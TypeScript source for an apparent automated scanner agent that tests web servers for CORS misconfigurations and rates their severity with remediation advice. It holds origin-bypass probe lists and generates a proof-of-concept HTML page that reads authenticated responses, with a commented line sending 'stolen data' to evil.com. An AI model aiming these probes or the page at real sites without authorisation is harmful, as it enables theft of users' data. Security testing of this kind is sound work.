import * as https from 'https'
import * as http from 'http'
import { BaseAgent, AgentStep, AgentResult, Evidence } from './agent-framework'

// HTTP helper for the CORS agent
async function corsProbe(
  url: string,
  origin: string,
  method: string = 'GET',
  extraHeaders: Record<string, string> = {}
): Promise<{ statusCode: number; headers: Record<string, string> } | null> {
  return new Promise((resolve) => {
    const parsedUrl = new URL(url)
    const client = parsedUrl.protocol === 'https:' ? https : http
    const req = client.request({
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method,
      timeout: 5000,
      rejectUnauthorized: false,
      headers: { 'Origin': origin, 'User-Agent': 'Mozilla/5.0', ...extraHeaders }
    }, (res) => {
      const headers: Record<string, string> = {}
      for (const [k, v] of Object.entries(res.headers)) {
        headers[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : (v ?? '')
      }
      res.resume()
      res.on('end', () => resolve({ statusCode: res.statusCode ?? 0, headers }))
    })
    req.on('error', () => resolve(null))
    req.on('timeout', () => { req.destroy(); resolve(null) })
    req.end()
  })
}

export class CorsAgent extends BaseAgent {
  name = 'cors-agent'
  description = 'Exploits and verifies CORS misconfigurations: wildcard origins, origin reflection, credential leakage, subdomain trust'
  handles = [
    'cors:wildcard-origin', 'cors:origin-reflection', 'cors:credentials-leak',
    'cors:null-origin', 'cors:subdomain-trust', 'cors:method-exposure'
  ]

  plan(finding: any): { name: string; description: string }[] {
    return [
      { name: 'test-attacker-origin', description: 'Send request with attacker-controlled origin' },
      { name: 'test-null-origin', description: 'Send request with null origin (sandboxed iframes)' },
      { name: 'test-subdomain-bypass', description: 'Test if subdomains of the target are trusted' },
      { name: 'test-prefix-suffix', description: 'Test origin validation bypasses (prefix/suffix attacks)' },
      { name: 'test-credentials', description: 'Test if credentials are allowed with permissive origins' },
      { name: 'test-methods', description: 'Check which HTTP methods are allowed cross-origin' },
      { name: 'generate-poc', description: 'Generate proof-of-concept HTML for exploitation' },
    ]
  }

  async executeStep(stepName: string, finding: any, previousSteps: AgentStep[]): Promise<string> {
    const url = finding._target

    switch (stepName) {
      case 'test-attacker-origin': {
        const origins = [
          'https://evil.com',
          'https://attacker.com',
          'http://localhost',
          'http://127.0.0.1',
        ]
        const results: string[] = []
        for (const origin of origins) {
          const res = await corsProbe(url, origin)
          if (!res) { results.push(`${origin}: [TIMEOUT]`); continue }
          const acao = res.headers['access-control-allow-origin'] ?? 'none'
          const acac = res.headers['access-control-allow-credentials'] ?? 'false'
          const reflected = acao === origin
          results.push(`${origin}: ACAO="${acao}" ACAC=${acac} ${reflected ? '[REFLECTED ⚠️]' : ''}`)
        }
        return results.join('\n')
      }

      case 'test-null-origin': {
        const res = await corsProbe(url, 'null')
        if (!res) return '[TIMEOUT]'
        const acao = res.headers['access-control-allow-origin'] ?? 'none'
        if (acao === 'null') {
          return `[VULNERABLE] Server accepts null origin!\nACAO: ${acao}\nThis can be exploited via sandboxed iframes: <iframe sandbox="allow-scripts" src="data:text/html,...">`
        }
        return `[SAFE] null origin not reflected. ACAO: ${acao}`
      }

      case 'test-subdomain-bypass': {
        const parsedUrl = new URL(url)
        const domain = parsedUrl.hostname
        const subdomainOrigins = [
          `https://evil.${domain}`,
          `https://test.${domain}`,
          `https://${domain}.evil.com`,       // suffix attack
          `https://evil-${domain}`,           // prefix attack
          `https://${domain.replace('.', '-')}.evil.com`,
        ]
        const results: string[] = []
        for (const origin of subdomainOrigins) {
          const res = await corsProbe(url, origin)
          if (!res) { results.push(`${origin}: [TIMEOUT]`); continue }
          const acao = res.headers['access-control-allow-origin'] ?? 'none'
          const reflected = acao === origin
          results.push(`${origin}: ACAO="${acao}" ${reflected ? '[BYPASS ⚠️]' : '[BLOCKED]'}`)
        }
        return results.join('\n')
      }

      case 'test-prefix-suffix': {
        const parsedUrl = new URL(url)
        const domain = parsedUrl.hostname
        // Regex bypass attempts
        const bypasses = [
          `https://${domain}.evil.com`,           // suffix: target.com.evil.com
          `https://evil${domain}`,                // prefix without dot
          `https://${domain}%60.evil.com`,        // encoded backtick
          `https://${domain}%0d.evil.com`,        // CRLF in origin
          `https://evil.com#.${domain}`,          // fragment bypass
        ]
        const results: string[] = []
        for (const origin of bypasses) {
          const res = await corsProbe(url, origin)
          if (!res) { results.push(`${origin}: [TIMEOUT]`); continue }
          const acao = res.headers['access-control-allow-origin'] ?? 'none'
          const reflected = acao === origin || acao === '*'
          results.push(`${origin}: ACAO="${acao}" ${reflected ? '[BYPASS ⚠️]' : '[BLOCKED]'}`)
        }
        return results.join('\n')
      }

      case 'test-credentials': {
        const res = await corsProbe(url, 'https://evil.com', 'GET', { 'Cookie': 'test=1' })
        if (!res) return '[TIMEOUT]'
        const acao = res.headers['access-control-allow-origin'] ?? 'none'
        const acac = res.headers['access-control-allow-credentials']
        if (acac === 'true' && (acao === '*' || acao === 'https://evil.com')) {
          return `[CRITICAL] Credentials allowed with permissive origin!\nACAO: ${acao}\nACAC: true\nAttacker can steal authenticated user data cross-origin.`
        }
        return `ACAO: ${acao}, ACAC: ${acac ?? 'not set'} — credentials ${acac === 'true' ? 'allowed' : 'not allowed'}`
      }

      case 'test-methods': {
        const res = await corsProbe(url, 'https://evil.com', 'OPTIONS', {
          'Access-Control-Request-Method': 'DELETE',
          'Access-Control-Request-Headers': 'Authorization, X-Custom-Header'
        })
        if (!res) return '[TIMEOUT]'
        const methods = res.headers['access-control-allow-methods'] ?? 'none'
        const headers = res.headers['access-control-allow-headers'] ?? 'none'
        const maxAge = res.headers['access-control-max-age'] ?? 'not set'
        return `Preflight response:\n  Methods: ${methods}\n  Headers: ${headers}\n  Max-Age: ${maxAge}`
      }

      case 'generate-poc': {
        const allOutputs = previousSteps.map(s => s.output ?? '').join('\n')
        const isReflected = allOutputs.includes('[REFLECTED') || allOutputs.includes('[BYPASS')
        const hasCredentials = allOutputs.includes('[CRITICAL] Credentials')

        if (!isReflected && !hasCredentials) {
          return '[NO POC] CORS configuration appears secure — no exploitation vector found.'
        }

        const poc = `<!-- CORS Exploitation Proof-of-Concept -->
<html>
<head><title>CORS PoC - ${url}</title></head>
<body>
<h2>CORS Exploitation PoC</h2>
<div id="result">Fetching...</div>
<script>
  fetch('${url}', {
    method: 'GET',
    credentials: '${hasCredentials ? 'include' : 'omit'}',
    headers: { 'Content-Type': 'application/json' }
  })
  .then(r => r.text())
  .then(data => {
    document.getElementById('result').innerText = 'Stolen data: ' + data;
    // Exfiltrate to attacker server:
    // fetch('https://evil.com/log?data=' + encodeURIComponent(data));
  })
  .catch(e => document.getElementById('result').innerText = 'Error: ' + e);
</script>
</body>
</html>`

        return `[POC GENERATED] Exploitation HTML:\n\n${poc}`
      }

      default:
        return `Step ${stepName} not implemented`
    }
  }

  analyze(finding: any, steps: AgentStep[]): AgentResult {
    const evidence: Evidence[] = steps.filter(s => s.output).map(s => ({
      type: (s.name === 'generate-poc' ? 'payload' : 'log') as Evidence['type'],
      label: s.name,
      content: s.output!
    }))

    const allOutput = steps.map(s => s.output ?? '').join('\n')
    const hasReflection = allOutput.includes('[REFLECTED')
    const hasBypass = allOutput.includes('[BYPASS')
    const hasCredLeak = allOutput.includes('[CRITICAL] Credentials')
    const hasNullOrigin = allOutput.includes('[VULNERABLE] Server accepts null')
    const hasPoc = allOutput.includes('[POC GENERATED]')

    let severity: AgentResult['severity'] = 'info'
    let exploitable = false

    if (hasCredLeak) { severity = 'critical'; exploitable = true }
    else if (hasReflection && hasBypass) { severity = 'high'; exploitable = true }
    else if (hasReflection || hasNullOrigin) { severity = 'high'; exploitable = true }
    else if (hasBypass) { severity = 'medium'; exploitable = true }

    return {
      verified: hasReflection || hasBypass || hasNullOrigin || hasCredLeak,
      exploitable,
      severity,
      evidence,
      recommendations: [
        'Never reflect the Origin header blindly — validate against a strict whitelist',
        'Never combine Access-Control-Allow-Credentials: true with wildcard or reflected origins',
        'Block null origin unless explicitly needed for sandboxed content',
        'Use exact domain matching, not regex or suffix matching',
        'Restrict Access-Control-Allow-Methods to only required methods',
      ],
      rawOutput: allOutput,
      cweId: 'CWE-942',
      cvssScore: hasCredLeak ? 8.6 : (exploitable ? 6.5 : null)
    }
  }
}
